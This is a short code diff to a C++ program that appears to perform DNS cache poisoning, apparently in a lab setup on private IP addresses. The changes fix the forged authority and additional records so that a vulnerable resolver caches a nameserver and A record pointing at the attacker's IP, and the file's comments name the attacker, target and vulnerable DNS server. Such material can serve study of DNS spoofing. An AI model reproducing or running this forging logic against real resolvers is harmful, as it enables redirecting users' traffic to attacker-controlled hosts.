@@ -9,7 +9,7 @@ std::uniform_int_distribution<int> uni(1025, 65000); //
 
 
 // We should know attackers IP (No I dont want to use system ip that runs this code directly)
-std::string attackersip = "192.168.0.130";
+std::string attackersip = "192.168.0.131";
 // Attacker should set up smt to welcome victim
 std::string targetip = "192.168.0.130";
 // Vulnerable DNS Server
@@ -117,11 +117,11 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		//build authoritative record field
 
 		DNS::Resource authority_field;
-		authority_field.dname(claim_domain);
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
 		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
-		authority_field.data(spoof_dns);
+		authority_field.data(claim_domain);
 
 		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
@@ -132,7 +132,7 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		faker_field.ttl(ttl_val);
 		faker_field.type(DNS::A);
 		faker_field.query_class(DNS::IN);
-		faker_field.data(targetip);
+		faker_field.data(attackersip);
 
 		resp_pkt.rfind_pdu<DNS>().add_additional( faker_field );
 
